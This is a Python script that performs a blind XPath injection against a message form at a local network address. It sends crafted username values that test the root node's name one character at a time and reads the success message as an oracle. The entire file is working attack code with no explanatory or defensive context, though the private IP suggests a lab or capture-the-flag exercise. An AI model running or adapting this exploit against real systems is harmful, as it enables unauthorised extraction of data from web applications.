import os, requests, json, re

def sendpayload():
    nodeName = ''
    url = "http://192.168.0.100:8000/message"
    characters = 'abcdefghijklmnopqrstuvwxyz'
    
    for i in range(1,10):
        for character in characters:
            sendpayload = requests.post(url,data={'username':f"invalid' or substring(name(/*[1]),{i},1)='{character}' and '1'='1",'msg':'test'})
            isvalid = re.search(r'Message successfully sent!',sendpayload.text)
            if isvalid:
                print("Valid character: " + character)
                nodeName += character
                break
            else:
                continue
    print(nodeName)
    
sendpayload()